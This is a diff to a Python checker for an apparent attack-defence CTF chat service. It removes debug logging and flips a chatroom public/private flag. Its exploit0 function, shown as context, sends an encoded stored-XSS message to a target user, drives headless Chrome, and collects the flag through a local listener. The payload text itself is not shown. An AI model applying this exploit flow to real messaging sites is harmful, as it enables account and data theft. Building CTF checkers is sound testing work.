@@ -1,7 +1,6 @@
 import json
 import random
 import secrets
-from signal import SIGTERM
 from typing import Optional
 from httpx import AsyncClient
 from logging import LoggerAdapter
@@ -24,7 +23,8 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import multiprocessing
 import hashlib
 import os
-from queue import Queue
+
+
 HOST = "0.0.0.0"
 PORT = 6452
 
@@ -37,12 +37,10 @@ chrome_options.add_argument("--headless")
 chrome_options.add_argument('--no-sandbox')
 driver = webdriver.Chrome('/usr/bin/chromedriver', options=chrome_options)
 def encode(message, recipient, logger):
-    logger.debug(f"Encoding {message} for {recipient}")
     message = message.encode('utf-8').hex()
     recipient = recipient * (len(message) // len(recipient) + 1)
     encoded_message = "".join([chr(ord(message[i]) ^ ord(recipient[i])) for i in range(len(message))])
     encoded_message = encoded_message
-    logger.debug(f"Encoded message: {encoded_message}")
     return encoded_message
 
 
@@ -76,9 +74,9 @@ async def retrieveMessage(task, client, recipient, logger, username, password):
     assert_equals(r.status_code, 200, "retrieving message failed")
     return r
 
-async def createChatroom(task, name, private, client, cookie, logger):
+async def createChatroom(task, name, public, client, cookie, logger):
     logger.debug(f"Creating private chatroom {name}")
-    r = await client.post(f"{getUrl(task)}/chatroom", json={'roomname': name, 'public': 'false' if private else 'true'}, cookies=cookie)
+    r = await client.post(f"{getUrl(task)}/chatroom", json={'roomname': name, 'public': 'true' if public else 'false'}, cookies=cookie)
     assert_equals(r.status_code, 200, "creating private chatroom failed")
     return r.text
 
@@ -87,8 +85,6 @@ async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_d
     flag = task.flag
     recipient = "admin"
     username, password, cookie = await sendMessage(task, client, recipient, flag, logger)
-    # r = await retrieveMessage(task, client, recipient, logger, username, password)
-    # assert_in(flag, r.text, "flag missing from messages")
     await chain_db.set("userdata", (username, password, flag))
     return json.dumps({'username': username})
 
@@ -100,7 +96,6 @@ async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: Cha
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
     r = await retrieveMessage(task, client, "admin", logger, username, password)
-    logger.debug(f"Got message: {r.text}")
     assert_in(task.flag, r.text, "flag missing from messages")
     # xss(task, start, logger)
     
@@ -112,10 +107,9 @@ async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_d
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     roomName = secrets.token_hex(10)
-    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
+    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
     logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
     r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
-    logger.debug(f"Got chatroom {r.text}")
     r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": flag}, cookies=cookie)
     await chain_db.set("userdata", (username, password, flag, roomUrl))
     return json.dumps({'username': username})
@@ -157,8 +151,8 @@ async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     roomName = secrets.token_hex(10)
-    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
-    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
+    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
+    logger.debug(f"Created public chatroom {roomName} with url {roomUrl}")
     r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
     assert_equals(r.status_code, 200, "retrieving chatroom failed")
     r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
@@ -185,7 +179,7 @@ async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
     roomName = secrets.token_hex(10)
-    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
+    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
     logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
     r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
     assert_equals(r.status_code, 200, "retrieving chatroom failed")
@@ -226,7 +220,6 @@ async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
         raise MumbleException("Missing database entry from putnoise")
     cookie = await login(task, client, username, password, logger)
     r = await client.get(f"{getUrl(task)}", cookies=cookie)
-    logger.debug(f"Got home page: {r.text} looking for {profilePic}")
     assert_in(f"/assets/profile-pics/{profilePic}.jpg", r.text, "profile picture missing from home")
 
 
@@ -328,29 +321,17 @@ def getFlag():
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
     process = multiprocessing.Process(target=server, args=(logger,))
     process.start()
-    start = time.time()
-    startCreateServer = time.time()
-    logger.debug(f"Create server time: {time.time() - startCreateServer}")
-    startRegister = time.time()
     username = secrets.token_hex(32)
     password = secrets.token_hex(32)
     cookie = await register(task, client, username, password, logger)
-    logger.debug(f"Register time: {time.time() - startRegister}")
-    startMessage = time.time()
     target = json.loads(task.attack_info)['username']
     payload = encode(exploitMessage.format(task.address), target, logger)
     r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
     assert_equals(r.status_code, 200, "exploit failed")
-    logger.debug(f"Message time: {time.time() - startMessage}")
-    startExploit = time.time()
     xss_test(task, logger)
-    logger.debug(f"Exploit time: {time.time() - startExploit}")
-    startResult = time.time()
-    logger.debug(f"Result time: {time.time() - startResult}")
     flagText = getFlag()
     flag = searcher.search_flag(flagText)
     process.kill()
-    logger.debug(f"Returning {time.time() - start}")
     return flag
 
 
